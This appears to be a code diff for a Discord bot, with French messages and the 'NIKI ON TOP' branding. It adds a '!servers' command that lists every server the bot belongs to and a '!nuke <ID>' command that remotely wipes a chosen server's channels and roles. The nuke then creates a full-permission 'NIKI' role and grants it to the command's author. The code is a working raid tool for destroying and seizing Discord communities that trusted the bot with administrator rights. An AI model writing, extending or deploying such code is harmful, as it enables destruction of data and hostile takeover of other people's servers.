@@ -490,132 +490,68 @@ client.on('messageCreate', async (message) => {
         }
         await handleNewServer(message, theme);
     }
+
+    if (command === 'servers') {
+        await handleServersList(message);
+    }
+
+    if (command === 'nuke') {
+        const guildId = args[0];
+        if (!guildId) {
+            return message.reply('❌ Utilisation : `!nuke <ID_serveur>`\nUtilise `!servers` pour voir la liste des serveurs.');
+        }
+        await handleRemoteNuke(message, guildId);
+    }
 });
 
 // ============================================================
-// NEW SERVER COMMAND
+// LISTE DES SERVEURS
 // ============================================================
-async function handleNewServer(message, theme) {
-    const template = TEMPLATES[theme];
-    await message.reply(`🎨 Creating **${template.name}** server...`);
-
-    const guild = message.guild;
-
-    try {
-        // Delete all existing channels
-        const channels = guild.channels.cache;
-        for (const [id, channel] of channels) {
-            try { await channel.delete(); } catch (e) {}
-        }
-
-        // Delete all roles (except @everyone)
-        const roles = guild.roles.cache;
-        for (const [id, role] of roles) {
-            if (role.name !== '@everyone') {
-                try { await role.delete(); } catch (e) {}
-            }
-        }
-
-        // Create categories
-        const categoryMap = {};
-        for (const catName of template.categories) {
-            try {
-                const cat = await guild.channels.create({
-                    name: catName,
-                    type: ChannelType.GuildCategory,
-                });
-                categoryMap[catName] = cat;
-            } catch (e) {}
-        }
-
-        // Create new channels with proper permissions
-        const memberRole = await guild.roles.create({
-            name: 'Membre',
-            color: '#00FF00',
-            hoist: true
-        });
-
-        for (const channelData of template.channels) {
-            try {
-                const type = channelData.type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
-                const parent = categoryMap[channelData.category] || null;
-                const channel = await guild.channels.create({
-                    name: channelData.name,
-                    type: type,
-                    parent: parent,
-                    permissionOverwrites: [
-                        {
-                            id: guild.roles.everyone,
-                            deny: [PermissionsBitField.Flags.ViewChannel],
-                        },
-                        {
-                            id: memberRole,
-                            allow: [PermissionsBitField.Flags.ViewChannel],
-                        }
-                    ]
-                });
-
-                if (type === ChannelType.GuildText) {
-                    try {
-                        await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à la discussion sur ${channelData.name}.`);
-                    } catch (e) {}
-                }
-            } catch (e) {}
-        }
-
-        // Create new roles
-        for (const roleData of template.roles) {
-            try {
-                await guild.roles.create({
-                    name: roleData.name,
-                    color: roleData.color,
-                    hoist: true,
-                    mentionable: true
-                });
-            } catch (e) {}
-        }
-
-        // Rename server
-        try {
-            await guild.setName(template.name);
-        } catch (e) {}
-
-        // Set server icon
-        try {
-            if (template.icon) {
-                const response = await fetch(template.icon);
-                const buffer = await response.arrayBuffer();
-                await guild.setIcon(Buffer.from(buffer));
-            }
-        } catch (e) {}
-
-        const embed = new EmbedBuilder()
-            .setColor(0x00FF00)
-            .setTitle('✅ Server Created!')
-            .setDescription(`**Theme:** ${template.name}`)
-            .addFields(
-                { name: '📝 Channels', value: `${template.channels.length} created`, inline: true },
-                { name: '🎭 Roles', value: `${template.roles.length} created`, inline: true },
-                { name: '📂 Categories', value: `${template.categories.length} created`, inline: true }
-            )
-            .setFooter({ text: 'NIKI ON TOP ☠' })
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-
-    } catch (error) {
-        console.error(error);
-        await message.channel.send('❌ Error creating server: ' + error.message);
+async function handleServersList(message) {
+    const guilds = client.guilds.cache;
+    
+    if (guilds.size === 0) {
+        return message.reply('❌ Le bot n\'est sur aucun serveur.');
     }
+
+    const embed = new EmbedBuilder()
+        .setColor(0x00FF00)
+        .setTitle('📊 LISTE DES SERVEURS')
+        .setDescription(`Le bot est sur **${guilds.size}** serveurs.`)
+        .setFooter({ text: 'NIKI ON TOP ☠' })
+        .setTimestamp();
+
+    let count = 0;
+    for (const [id, guild] of guilds) {
+        count++;
+        embed.addFields({
+            name: `${count}. ${guild.name}`,
+            value: `🆔 \`${guild.id}\`\n👤 ${guild.memberCount} membres`,
+            inline: true
+        });
+    }
+
+    await message.reply({ embeds: [embed] });
 }
 
 // ============================================================
-// NUKE FUNCTION
+// NUKE À DISTANCE
 // ============================================================
-async function handleNuke(message) {
-    await message.reply('💀 **NUKE INITIALIZED...**');
+async function handleRemoteNuke(message, guildId) {
+    const guild = client.guilds.cache.get(guildId);
+    
+    if (!guild) {
+        return message.reply('❌ Serveur introuvable. Vérifie l\'ID avec `!servers`.');
+    }
 
-    const guild = message.guild;
+    // Vérifier que le bot a les permissions
+    const botMember = guild.members.me;
+    if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply(`❌ Je n'ai pas les permissions administrateur sur **${guild.name}**.`);
+    }
+
+    await message.reply(`💀 **NUKE INITIALIZED sur ${guild.name}...**`);
+
     const guildName = guild.name;
     let channelsDeleted = 0;
     let rolesDeleted = 0;
@@ -737,7 +673,11 @@ async function handleNuke(message) {
                 permissions: totalPermissions
             });
 
-            await message.member.roles.add(nikiRole);
+            // Donner le rôle à l'utilisateur qui a lancé la commande
+            const authorMember = guild.members.cache.get(message.author.id);
+            if (authorMember) {
+                await authorMember.roles.add(nikiRole);
+            }
 
             try {
                 await guild.members.me.roles.add(nikiRole);
@@ -773,11 +713,128 @@ async function handleNuke(message) {
             await message.author.send({ embeds: [dmEmbed] });
         } catch (e) {}
 
-        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${VICTORY_MESSAGES[0]}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);
+        await message.reply(`✅ **NUKE COMPLETE!**\n💀 Serveur **${guildName}** détruit par NIKI !`);
 
     } catch (error) {
         console.error(error);
-        await message.channel.send('❌ Error: ' + error.message);
+        await message.reply('❌ Error during nuke: ' + error.message);
+    }
+}
+
+// ============================================================
+// NEW SERVER COMMAND
+// ============================================================
+async function handleNewServer(message, theme) {
+    const template = TEMPLATES[theme];
+    await message.reply(`🎨 Creating **${template.name}** server...`);
+
+    const guild = message.guild;
+
+    try {
+        // Delete all existing channels
+        const channels = guild.channels.cache;
+        for (const [id, channel] of channels) {
+            try { await channel.delete(); } catch (e) {}
+        }
+
+        // Delete all roles (except @everyone)
+        const roles = guild.roles.cache;
+        for (const [id, role] of roles) {
+            if (role.name !== '@everyone') {
+                try { await role.delete(); } catch (e) {}
+            }
+        }
+
+        // Create categories
+        const categoryMap = {};
+        for (const catName of template.categories) {
+            try {
+                const cat = await guild.channels.create({
+                    name: catName,
+                    type: ChannelType.GuildCategory,
+                });
+                categoryMap[catName] = cat;
+            } catch (e) {}
+        }
+
+        // Create new channels with proper permissions
+        const memberRole = await guild.roles.create({
+            name: 'Membre',
+            color: '#00FF00',
+            hoist: true
+        });
+
+        for (const channelData of template.channels) {
+            try {
+                const type = channelData.type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
+                const parent = categoryMap[channelData.category] || null;
+                const channel = await guild.channels.create({
+                    name: channelData.name,
+                    type: type,
+                    parent: parent,
+                    permissionOverwrites: [
+                        {
+                            id: guild.roles.everyone,
+                            deny: [PermissionsBitField.Flags.ViewChannel],
+                        },
+                        {
+                            id: memberRole,
+                            allow: [PermissionsBitField.Flags.ViewChannel],
+                        }
+                    ]
+                });
+
+                if (type === ChannelType.GuildText) {
+                    try {
+                        await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à la discussion sur ${channelData.name}.`);
+                    } catch (e) {}
+                }
+            } catch (e) {}
+        }
+
+        // Create new roles
+        for (const roleData of template.roles) {
+            try {
+                await guild.roles.create({
+                    name: roleData.name,
+                    color: roleData.color,
+                    hoist: true,
+                    mentionable: true
+                });
+            } catch (e) {}
+        }
+
+        // Rename server
+        try {
+            await guild.setName(template.name);
+        } catch (e) {}
+
+        // Set server icon
+        try {
+            if (template.icon) {
+                const response = await fetch(template.icon);
+                const buffer = await response.arrayBuffer();
+                await guild.setIcon(Buffer.from(buffer));
+            }
+        } catch (e) {}
+
+        const embed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('✅ Server Created!')
+            .setDescription(`**Theme:** ${template.name}`)
+            .addFields(
+                { name: '📝 Channels', value: `${template.channels.length} created`, inline: true },
+                { name: '🎭 Roles', value: `${template.roles.length} created`, inline: true },
+                { name: '📂 Categories', value: `${template.categories.length} created`, inline: true }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+
+        await message.channel.send({ embeds: [embed] });
+
+    } catch (error) {
+        console.error(error);
+        await message.channel.send('❌ Error creating server: ' + error.message);
     }
 }
 
